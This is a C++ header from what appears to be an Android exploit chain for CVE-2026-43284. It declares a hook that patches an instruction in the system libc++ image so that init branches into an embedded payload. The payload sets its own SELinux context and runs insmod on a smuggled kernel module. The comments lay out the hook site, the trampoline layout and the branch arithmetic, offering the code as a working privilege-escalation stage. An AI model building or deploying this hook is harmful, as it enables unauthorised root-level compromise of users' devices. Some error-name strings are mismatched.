#pragma once
/** @file backend/cve_2026_43284/hook/sentry_hook.hpp
 *  The sentry hook: what to write where, and the payload that gets written.
 *
 *  What the hook is for. The chain's last step is a load that only a privileged context may perform,
 *  and the one privileged context the chain can reach without root is init: the sentry branch the
 *  hook takes runs in init's own thread when it reaps the orphan the trigger created. So the hook
 *  replaces one instruction of a function init calls with a branch into the payload
 *  (embed/libcxx_blob.hpp), which writes its own SELinux exec context and runs
 *  \`/vendor/bin/insmod <carrier>\` -- the carrier being the file patch #2 wrote the module into.
 *
 *  Shape. Two writes and nothing else: one word at the hook site (into the sixteen-byte block that
 *  holds it, so the rest of the block is preserved), and the payload at the landing site, whose own
 *  layout carries the two words the trampoline needs -- the instruction it displaced, and the branch
 *  back to the instruction after the site. The plan below is every number those two writes need.
 *
 *  Where the numbers come from, stated plainly because they are facts about one image and not
 *  constants of the method: the plan carries the values derived for
 *  \`/system/lib64/libc++.so\` as this device ships it (sha256 and the derivation are in the .cpp), and
 *  a different image needs a different plan. The retired tree derived them from the image at run time
 *  (its \`steps/elf_hook.cpp\`); that derivation is not ported yet, so the plan is declared here with
 *  its provenance instead of guessed. Nothing in this header reads the image.
 *
 *  Bounds: the payload must fit the landing room the plan reports, entry and jump-back words must be
 *  inside the blob, and every address the two branches compute must be four-byte aligned and inside
 *  the branch range; a plan that fails any of those is refused rather than written.
 */
#include <cstddef>
#include <cstdint>

namespace ghostlock::backend::cve_2026_43284::hook {
    /** Why a plan or a payload was refused. */
    enum class SentryError : unsigned char {
        Ok = 0,
        InvalidPlan = 1,
        /** The payload does not fit the landing room the plan reports. */
        NoRoom = 2,
        /** A branch address is unaligned or out of range. */
        BranchOutOfRange = 3,
        /** The output buffer is too small. */
        OutputTooSmall = 4,
    };

    [[nodiscard]] constexpr const char *sentry_error_name(SentryError error) noexcept {
        switch (error) {
            case SentryError::Ok: return "ok";
            case SentryError::InvalidPlan: return "param-invalid";
            case SentryError::NoRoom: return "budget-exceeded";
            case SentryError::BranchOutOfRange: return "width-mismatch";
            case SentryError::OutputTooSmall: return "budget-exceeded";
        }
        return "unknown";
    }

    /** Everything the two writes need. All file offsets are in the hooked image. */
    struct SentryPlan final {
        /** Where the branch goes: the file offset and the virtual address of the hooked word. */
        std::uint64_t hook_file_offset = 0U;
        std::uint64_t hook_vaddr = 0U;
        /** The prologue guard that was skipped to reach the site, for the report. */
        std::uint32_t guard_instruction = 0U;
        bool guard_skipped = false;
        /** The instruction the payload replays; it is what used to be at the site. */
        std::uint32_t displaced_instruction = 0U;
        /** Where the payload goes, and how much room the image has there. */
        std::uint64_t payload_file_offset = 0U;
        std::uint64_t payload_vaddr = 0U;
        std::uint64_t payload_max_bytes = 0U;
        /** The payload's entry, the word it replays, and the word that branches back: the blob's
         *  own layout, carried so a caller needs one struct and not three constants. */
        std::size_t entry_offset = 0U;
        std::size_t displaced_offset = 0U;
        std::size_t jump_back_offset = 0U;
    };

    /** The plan for the image this device ships, with its provenance in the .cpp. */
    [[nodiscard]] SentryPlan device_sentry_plan() noexcept;

    /**
     *  The word that replaces the hooked instruction: a branch from the site to the payload's entry.
     *
     *  @param plan The plan.
     *  @param out  Receives the instruction word.
     *  @return Ok, or the branch refusal.
     */
    [[nodiscard]] SentryError hook_branch(const SentryPlan &plan, std::uint32_t &out) noexcept;

    /**
     *  Build the payload: the embedded blob with its two parameterised words filled in.
     *
     *  @param plan     The plan; its payload room bounds @p capacity.
     *  @param out      Receives the payload, padded to the sixteen-byte block.
     *  @param capacity How many bytes @p out holds.
     *  @param size     Receives the padded length.
     *  @return Ok, or a named refusal. The buffer is untouched on refusal.
     *  @note   Pure: the same plan always gives the same bytes, which is what lets the host test pin
     *          the two words and the branch arithmetic.
     */
    [[nodiscard]] SentryError build_sentry_payload(const SentryPlan &plan, std::uint8_t *out,
                                                   std::size_t capacity,
                                                   std::size_t &size) noexcept;
}  // namespace ghostlock::backend::cve_2026_43284::hook
